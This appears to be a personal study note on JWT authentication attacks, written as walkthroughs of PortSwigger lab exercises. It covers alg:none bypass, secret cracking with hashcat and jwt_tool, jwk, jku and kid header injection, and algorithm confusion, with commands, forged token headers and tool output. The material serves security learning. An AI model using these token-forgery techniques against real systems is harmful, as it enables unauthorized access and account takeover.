---
sticker: emoji//2705
---
## JWT attacks
Typically arise from:
- **Improper signature validation/verification** - due to how flexible implementing JWTs can be (leading to misconfigurations being common).
- **Weak or leaked server signing keys**

Further, as **servers don't usually store any information about the JWTs they issue**, including the **original content & signature**, if the signature is not properly verified / signing key can be cracked, the **original contents can be changed at will.**

##### Tools:
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) (Burp plugin)
- [`JWT_Tool`](https://github.com/ticarpi/jwt_tool) - python CLI tool for brute-forcing & verifying JWT security
- [`jwt_forgery`](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone)

#### Resources:
- https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
- https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- https://www.vaadata.com/en/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/

### Verifying JWT Signatures
Several JWT vulnerabilities revolve around the verification of `JWT` signatures
##### Accepting arbitrary signatures (JWT sig. not verified)
When incoming tokens are just decoded (`decode()`), but signatures are not verified (`verify()`). Thus, adversaries can sign modified contents with an arbitrary signature.
**Steps:** Open existing JWT, edit contents & send as-is.
##### Accepting tokens with no signature
The `alg` field of a JWT contains **which algorithm was used to sign the `JWT`**, and thus, **which algorithm the server uses to verify the signature.** However, this means the server is implicitly trusting user-controllable input, and adversaries can manipulate **how the server verifies the token** by modifying this.
`JWT`s can also be **left unsigned - `alg: none`**, and servers typically reject these, but can be obfuscated in several ways to bypass string matching filter rules:
- `alg: nOnE`
- `alg: none`
**Steps:** Open existing JWT, edit contents, change `alg: none`, and send.
![](attachments/Pasted%20image%2020260611172639.png)


##### Lab #1: [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.*
*To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.*
*You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we observe we're issued a JWT which, when decoded, contains our session information, signed by the RE256 algorithm (asymmetric):
![](attachments/Pasted%20image%2020260611170247.png)

Trying to modify this token, say our `sub` to another user like `administrator`... just works.
![](attachments/Attacking%20JWTs.png)
From here, we can go to the admin panel & delete `carlos` to solve the lab.

##### Lab #2: [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.*
*To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.*
*You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening this up, changing the value of `sub` to `administrator`, and setting `alg: none` (via `Attack`--> `"none" Signing Algorithm` feature of [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd))
![](attachments/Pasted%20image%2020260611172639.png)

---

## Brute-forcing secret keys
Due to supporting multiple algorithms, the **strength of said algorithm** can affect the JWT's security. E.g., the `HS256` (HMAC + SHA-256) algorithm uses a **standalone symmetric key** as the secret. If this key is weak, it can be cracked with a tool like `jwt_tool` or `hashcat`, and a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).
- `hashcat -a 0 -m 16500 <jwt> <wordlist>` (upon consecutive runs, add `--show`)
In JWT mode, `hashcat` signs the header + payload with each secret from the wordlist, & compares the result with the original JWT to see if it matches

#### Cracking weak JWT secret keys with `jwt_tool`
#jwt_tool #jwt_io
- [install here](https://github.com/ticarpi/jwt_tool)
Usage:
``` bash
./jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.nGJcg_Z8D_DSavfw-bwrKYFBTkkX-HA9uQrIAyVF7tk' --crack -d jwt-common.txt
```
Or something like `/SecLists/Passwords/scraped-JWT-secrets.txt`
#### Decoding vs Verifying
- **Decode:** *does NOT verify signature* - decodes token & trusts contents implicitly
- **Verify:** verifies signature before decoding
So if tokens are being **decoded** (not verified), just use a tool like [jwt.io](https://www.jwt.io/) to modify the **user/any details** in the JWT to impersonate a user.
#### Resources:
- [Cracking JSON Web Tokens](https://www.youtube.com/watch?v=2RKCDhH6dyA)



##### Lab #3: [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a [wordlist of common secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).*
*To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.*
*You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening this up, changing the value of `sub` to `administrator`, and setting `alg: none` doesn't do anything. 

Whipping open `jwt_tool`, we can attempt to brute force the secret with the provided wordlist (`hashcat` also works):
- `./jwt_tool.py 'eyJraWQiOiI0NTA4MDY2Ny1hNjVmLTQ5ZTQtOWY3YS0zNTU0ZDdlMTU5NDkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTE3MTIxOCwic3ViIjoid2llbmVyIn0.NFuG4JlBnn9npvaUYKb6OOzN8z5rBYevZje0tliWOZ8' --crack -d wordlists/jwt.secrets.list`
  ![](attachments/Pasted%20image%2020260611182500.png)
Yippee, the correct key was found. So, create a new symmetric (as `HS256` is symmetric) signing key in `JWT Editor`:
![](attachments/Pasted%20image%2020260611183157.png)

Then use it to sign our modified request in repeater:
![](attachments/Pasted%20image%2020260611183302.png)
And send the request, now we can access `/admin` & delete `carlos`!
![](attachments/Pasted%20image%2020260611183354.png)

---
## JWT header parameter injections
Whilst only the `alg` header parameter is required by the JWS spec, JWT/JOSE headers can also contain other parameters that can be manipulated, like:
- **`jwk` (JSON Web Key)** - Provides an embedded JSON object representing the key.
- **`jku` (JSON Web Key Set URL)** - Provides a URL from which servers can fetch a set of keys containing the correct key.
- **`kid` (Key ID)** - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching `kid` parameter.
*These all tell the server **which key to use** when verifying the signature*

#### Injecting self-signed JWTs
Using the `type: "JWT"` method, you can **embed your own public key** in the JWT header, and **sign the modified message with your private key**, and hoping the server **accepts any key embedded in the `jwk` parameter.** (may need to update the JWT's `kid` header parameter to match the `kid` of the embedded key).
*This works similarly with any compromised JWK private keys you obtain.*
``` json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```



##### Lab #4: [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.
To solve the lab, modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening up the `/admin` endpoint, we see it's restricted to administrators (crazy!?!). So, let's try and create a key to sign a modified session cookie as `sub: "administrator"`. Using the `JWT Editor` tab, we can create a new RSA key:
![](attachments/Pasted%20image%2020260611190443.png)

And then go to our Repeater request, modify the header to `sub: "administrator"`, and use `Attack` --> `Embedded JWK`, select our RSA key ID, and voila! (`kid` updated automatically).
![](attachments/Pasted%20image%2020260611190619.png)
Now we can access `/admin` & delete the poor fella again.
![](attachments/Pasted%20image%2020260611190726.png)

---

#### Injecting self-signed JWTs via `jku` parameter
the **`jku` (JWK Set URL)** parameter allows you to reference a remote **`JWK Set`** (a JSON object with an array of JWKs representing different keys), with the relevant key fetched from this URL by the server:
``` json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
	        "kty": "RSA",
		    "e": "AQAB",
		    "kid": "JKU",
		    "n": "2AKb5Y2_nEW8-3VcqXlJHHFDg_Auj7jubgq6XangROgU4fN9FDpDIylJt4ZfOmBl1cMm83O5Yrw1002R36tCzbugUdLFkXv4_wotdkR8WIyRo3X5fwzHz4G-VyUMRLR9AYY6i2PoxKG_HEBj1rY14Ik4KkrDn3xR225zKCgSd_TzfEH36qPsMhzlaBKnGBRb3p9_XbrPOIK7G7PfUhhdv5kgcuDPojkSXPel0ZM3y25_ivPU4ZiNFWHG8euS10Zr-WD2rYhX-TsQpnHRbr8wUKC_fm9A4OwOnD5YnMTnJy0LXTVb66KpX3Jm_4jdXoVniK7_TEk2FLPCrNh9GxNvKw"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```
These `JWK Sets` are **often exposed via commonly-known urls**, like `/.well-known/jwks.json`. Consider using **[url bypass methods](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)** (cheatsheet here!) to access this, or similar "protected" files.

##### Lab #5: [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. The server supports the `jku` parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening up the `/admin` endpoint, we see it's restricted to administrators (wha!?!).
Browsing for keys at `/.well-known/jwks.json` brings up nothing. Hmm. 
Creating our own RSA key again, getting the public key for it (right click on created key --> `Copy public key as JWK`), and saving the relevant fields on our exploit server in the `jku` format:
![](attachments/Pasted%20image%2020260611192752.png)
``` json
{
    "keys": [
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "JKU",
    "n": "2AKb5Y2_nEW8-3VcqXlJHHFDg_Auj7jubgq6XangROgU4fN9FDpDIylJt4ZfOmBl1cMm83O5Yrw1002R36tCzbugUdLFkXv4_wotdkR8WIyRo3X5fwzHz4G-VyUMRLR9AYY6i2PoxKG_HEBj1rY14Ik4KkrDn3xR225zKCgSd_TzfEH36qPsMhzlaBKnGBRb3p9_XbrPOIK7G7PfUhhdv5kgcuDPojkSXPel0ZM3y25_ivPU4ZiNFWHG8euS10Zr-WD2rYhX-TsQpnHRbr8wUKC_fm9A4OwOnD5YnMTnJy0LXTVb66KpX3Jm_4jdXoVniK7_TEk2FLPCrNh9GxNvKw"
}
    ]
}
```
![](attachments/Attacking%20JWTs-1.png)

Then, we can supply the URL to this `keys.json` file containing our keyset inside the modified JWT header:
```
{
  "alg": "RS256",
  "kid": "JKU",
  "jku": "https://exploit-0a6c0031034190d08003b121016400e0.exploit-server.net/keys.json",
}
```

Then, make sure to modify `sub = administrator` **AND** sign the JWK with your corresponding `RSA` private key!
![](attachments/Pasted%20image%2020260611193243.png)

Send it, and then delete our favourite boy.
![](attachments/Pasted%20image%2020260611193325.png)


---

### Injecting self-signed JWTs via the kid parameter
**`kid` (Key ID)** parameter: an **arbitrary key of the developer's choosing** (e.g. name of a file, entry in database, etc.) that specifies to the server **which key to use** when verifying a JWT's signature.

Always test the `kid` for #path-traversal, to try and load an arbitrary file, or even #SQLi if it retrieves a key from a database!
``` json
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

If the server **also accepts a [symmetric algorithm](https://auth0.com/docs/get-started/applications/signing-algorithms)**, you attempt to **point the `kid` to any predictable/static file**, and then **sign your own `JWT`** using a **secret that matches the file contents**.
- Try using `../../../..../dev/null`, as is an **empty file** - so ***signing the JWT with an empty string*** will produce a valid signature.

#### Other interesting JWT header parameters
- `cty` (Content Type): occasionally used to declare a media type for JWT payload, **test to see whether server supports it**. 
  **Attack:** If signature verification can be bypassed, as the **key payload is parsed by the application**, can change content type to `text/xml` or `application/x-java-serialized-object` to exploire #xxe or [Insecure Deserialization](../Insecure%20Deserialization/Insecure%20Deserialization.md) 
- `x5c` (X.509 Certificate Chain): Passes the **`X.509` public key certificate (or chain)** of the key used to digitally sign the JWT.
  **Attack:** Can **inject a self-signed embedded certificate here** (like the `jwk` header injection), and potentially also **exploit parsing vulnerabilities for the `X.509` certificate** *(advanced, see [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633))*




##### Lab #6: [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

**Objective:** *This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem. To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`. To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter*

Logging in, we're issued a JWT for our `session` cookie. Opening up the `/admin` endpoint, we see it's restricted to administrators (wha!?!).

So, given the server fetches the JWT signing key from the filesystem, let's try and see if we can access other files on the system, like `/dev/null`.
As we know that `/dev/null` should be an empty file, it should return an empty string, and thus cause the server to **verify any key signed with an empty `secret`**.
So, using JWT Editor to create a new symmetric key (as server uses `HS256`):
![](attachments/Pasted%20image%2020260611212347.png)

And then modifying our request to include the `"kid": "../../../../dev/null"` and `sub: administrator`, & signing the message with our empty key:
![](attachments/Pasted%20image%2020260611212832.png)
... we can now access the admin page and delete good ol...
![](attachments/Pasted%20image%2020260611212951.png)

---


## Algorithm Confusion Attacks
When an adversary **forces the server to verify a JWT signature** using a **different algorithm than intended** by the website's developers. This can allow attackers to forge valid JWTs **without needing the server's private key**.
- *E.g. **using an exposed server's public key** to sign a JWT using the **symmetric `HS256` algorithm**, and **then forcing the server to fall back to `HS256` signing**, for which it will **use it's own (exposed) public key** to verify the message.*

#### How they arise
Most libraries **rely on a single algorithm-agnostic signing method** (e.g. `verify()`), **determining the algorithm to use via the `alg` parameter**. 
This can result in flawed logic, such as when using fixed public key (e.g. `publicKey = <public-key-of-server>;`) and then **deciding the type of algorithm to perform based on the `alg` header.** 

E.g. for the below code, if the server's public key is exposed, by specifying `alg: HS256` the server will **fall back to using the symmetric `HS256` algorithm**, with it's **own public key as the symmetric verifier**. This allows **any message signed by the (exposed) public key to be validated.**
``` js
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key --> which permits messages SIGNED BY THE PRIVATE KEY ONLY
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key --> which permits messages SIGNED BY THE SERVER PUBLIC KEY
    }
}
```
- **Note:** the public key used to sign the token ***must be absolutely identical to the public key stored on the server*** - so must use **the same format** (e.g. `X.509 PEM`, try a few) and **include all non-printing characters (`\r`, `\n` e.g.)**
### Steps for an Algorithm Confusion Attack:
1. **[Obtain the server's public key](https://portswigger.net/web-security/jwt/algorithm-confusion#step-1-obtain-the-server-s-public-key)** - search for [common `jwks.json` locations](https://github.com/h0tak88r/Wordlists/blob/master/jwks-common.txt), `/jwks.json` or `/.well-known/jwks.json`
2. **[Convert the public key to a suitable format](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format)** as **server uses a local copy of the key to verify the signature**, often stored in a **different format** (e.g. `X.509 PEM`, but may need to try different ones)
   ![](attachments/Pasted%20image%2020260611215021.png)![](attachments/Attacking%20JWTs-2.png)![585](attachments/Pasted%20image%2020260611220207.png)
   Then, go back to `JWT Editor`, create a `New Symmetric Key` & paste the base64 PEM as the `k` value. This is our key containing the encoded **server public key**, and should hopefully match the format stored on the server!
![](attachments/Pasted%20image%2020260611215643.png)
3. **[Create a malicious JWT](https://portswigger.net/web-security/jwt/algorithm-confusion#step-3-modify-your-jwt)** with a modified payload and the `alg` header set to `HS256`.
4. **[Sign the token with HS256](https://portswigger.net/web-security/jwt/algorithm-confusion#step-4-sign-the-jwt-using-the-public-key),** using the public key as the secret.
   ![](attachments/Pasted%20image%2020260611220415.png)
   
### Deriving public keys from existing tokens
Where public keys aren't exposed, you can attempt to **derive your own from a pair of existing `JWTs`**, e.g. using tools like `jwt_forgery.py`. This:
1. Uses the two `JWTs` to **calculate 1 or more values of `n`**, with each containing:
	- a potential **candidate public key (Base64-encoded `PEM` key in both `X.509` and `PKCS1` format)**
	- a **forged JWT signed by the key**
2. Send each forged `JWT` in repeater, to check which works for an algorithm confusion attack

##### Tool: 
- [`jwt_forgery`](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone)
- Portswigger's stripped down docker version - `docker run --rm -it portswigger/sig2n <token1> <token2> `


##### Lab #7: [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening up the `/admin` endpoint, we see it's restricted to administrators (in *this* economy!?!).

Browsing to `/.jwks` to see if there are any exposed keys, we see:
```
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"1d93f8f2-8f70-4e6f-98ba-bf09ccfcbf57","alg":"RS256","n":"6LCqPdue64BM8-VVE4UX5udBBydDA1oysVhfim5E8IW4tinRRahTGqpNn3LfVAPj23Vklko9EMLk8j_mea6zeJR9QbCia7ijZrYUDkfAeCRIossYwNwfynRDy8qZNTjww-pCMAQPE0xe-8gTmeG2X6QGelURp-meOA_AOl1pvBi6D0MCryuJb-saho7HRGthqT0OH3oc8c5JYIm1-OtYxKdHUN2VfFSZo6DZQbnsVgTvI1vKrZPdRxJLaRvNpR93r4gcN_L6XkOL_7CZJmDJhf-qvo_mDhApX5rgyq8jiD0W-8IJNGaKPzAeNfucoKtuxm5EY_yd-VJ75wqFHyLlGw"}]}
```
Oh, that's handy! A public key for the server.

We can now add this leaked key as a `New RSA key`, and copy the FULL `PEM` version of the key. This will be in case the server is vulnerable to an algorithm confusion attack, and can be convinced to use the HS256 algorithm. If it does, it will then likely **use it's own public key as HMAC secret** to verify the key, which will match a key signed with `HS256` + the **leaked public key**!
However, this public key must exactly match the file stored on the server. So, we can convert it to a different format if needed, like `PEM` (`X.509 PEM`), to then use in the final symmetric signing key.

So, using the public key we found, create a new RSA key and copy it's PEM value:
![](attachments/Pasted%20image%2020260611215021.png)
![](attachments/Attacking%20JWTs-2.png)

From here, go to Decoder and **encode the WHOLE PEM key as Base64**. 
![585](attachments/Pasted%20image%2020260611220207.png)
Then, go back to `JWT Editor`, create a `New Symmetric Key` & paste the base64 PEM as the `k` value. This is our key containing the encoded **server public key**, and should hopefully match the format stored on the server!
![](attachments/Pasted%20image%2020260611215643.png)

Now, we can replace the `"alg": "HS256"` (to tell the server to **verify using a symmetric key**) and `"sub": "administrator"` to tamper with our token user, and then **SIGN** and send it!
![](attachments/Pasted%20image%2020260611220415.png)
And, of course... 💀 poor `carlos`.
![](attachments/Pasted%20image%2020260611220609.png)

---

##### Lab: [JWT authentication bypass via algorithm confusion with no exposed key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
**Objective:** *This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`*

Logging in, we're issued a JWT for our `session` cookie. Opening up the `/admin` endpoint, we see it's restricted to administrators (am i surprised? *of course!!11!11*).

As we've been hinted at there being no *exposed* public keys, hop onto your \*nix-based CLI of choice, and install [`jwt_forgery.py`](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone) using docker or `uv`. 
We need to derive some public keys!

Log in to the site again, so we can generate and collect **two `JWTs`** (in the serialized format, `XXXX.XXXX.XXXX`), and then run:

``` js
uv run jwt_forgery.py JWT.FIRST.LOGIN JWT.SECOND.LOGIN

// e.g. 
uv run jwt_forgery.py eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTI2ODE3MCwic3ViIjoid2llbmVyIn0.rFEYmB9wRQlp0TpNI2_ggr-Kezp4-4cvgUWjYM4Tg6DtYU18_LcS0ER91ObOdXyOM_f37GqLhqWR2MbinwExPhnt2wWmb6kjW-L0MGuE8o9Aul84IVoPNMBuRltz1vG88E7x90sBefmqEmNMZTqPL_cXN0wJcPN1Swy52Sn8H-T_ybb4TzTo-QP89NFPFDMvzJCg34QplDNYFg8xXQPsh75WuytHspRzhgTXAP6fdCT00XyrhyhffLhAQ_68yE-3oyTBINjru_N-703z6LpSoJ1HeHO15EZQxrKFW6KDWkxoIpy4Hr4CfyYL2Fz5h9hC3zPaPzVFb0Ga5PVvRlk9sA eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTI2ODI1NSwic3ViIjoid2llbmVyIn0.qSZzUH7l-r_rUsm48WR2yPMgAJTkDf7n0BNQUK3X3e61y3YgJIRcH_y0PD8NY58EoTfhECMi-9Y1D-DM5kAoJDfPCGu7qQq9kBqdkxF-5DSF-Nm9ligzl2C-PxhtgQegrq4tahQwa89YvxpOhHSWLXocbp6qtZ7Wuak1npGfj0sCiDUzqnTi_YrtXq_NrqxHXCk_-KORHwUc3XLXvLNVvihs_KjZQiK8FCXMFL9rQxTXlqdLCTBgO-gk2hQcIPIaVpVTH1FFgKrfjPziqxDNamVj0Mn2O4BW3VGMZuvBcxwCAiCu_lrn8hWgZzQQFx4o3t9a2j9bFgBwXYsk7-3F8Q
```

After a few minutes, should output something similar to the following:
``` bash
[*] GCD:  0x1
[*] GCD:  0xb19f0f149b1c09e8f9.....<SNIP>
[+] Found n with multiplier 1  :
 0xb19f0f149b1c09e8f9.....<SNIP>
[+] Written to b19f0f149b1c09e8_65537_x509.pem
[+] Tampered JWT: b'eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4MTM1MTIwMywgInN1YiI6ICJ3aWVuZXIifQ.xaLMK-1SHIE8j6o8R6fL9Lti_dDOxGKvWy_pUN6NYZs'
[+] Written to b19f0f149b1c09e8_65537_pkcs1.pem
[+] Tampered JWT: b'eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4MTM1MTIwMywgInN1YiI6ICJ3aWVuZXIifQ.hmFeBU3MeeGUknOaF_6n-gsFaNw1T3d2-QYRyuCS0vE'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================

eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4MTM1MTIwMywgInN1YiI6ICJ3aWVuZXIifQ.xaLMK-1SHIE8j6o8R6fL9Lti_dDOxGKvWy_pUN6NYZs
eyJraWQiOiI2ZTNiZWI5ZC01ZjJmLTQ0YzUtOGYwOC1lODdkYzg3MDYxZmUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4MTM1MTIwMywgInN1YiI6ICJ3aWVuZXIifQ.hmFeBU3MeeGUknOaF_6n-gsFaNw1T3d2-QYRyuCS0vE
```

Testing these derived public keys using the **first re-signed JWT at the end** (which is conveniently already signed with the first `X.509` key, using `HS256`)... it works!
![](ATTACHMENTS/Screenshot%202026-06-12%20at%209.19.55%20pm.png)

As expected, the second one doesn't:
![](ATTACHMENTS/Screenshot%202026-06-12%20at%209.19.35%20pm.png)

So, **our first JWT is the correctly signed one** - meaning our correct derived public key is `b19f0f149b1c09e8_65537_x509.pem`.

So, copy the entire contents of this file & converting it all into base64 using burp's Decoder (or similar). Then, via extension `JWT_Editor`, create a new `Symmetric Key` with an empty secret, and replace the empty `k` value with your B64-encoded `b19f0f149b1c09e8_65537_x509.pem`:
![](ATTACHMENTS/Screenshot%202026-06-12%20at%209.25.10%20pm.png)

Then tamper with & sign a given request, ensuring to change the request location to `/admin`:
![](ATTACHMENTS/57599.png)

![](ATTACHMENTS/Screenshot%202026-06-12%20at%209.29.40%20pm.png)

Now, `carlos` shall be laid to rest one final (?) time.

---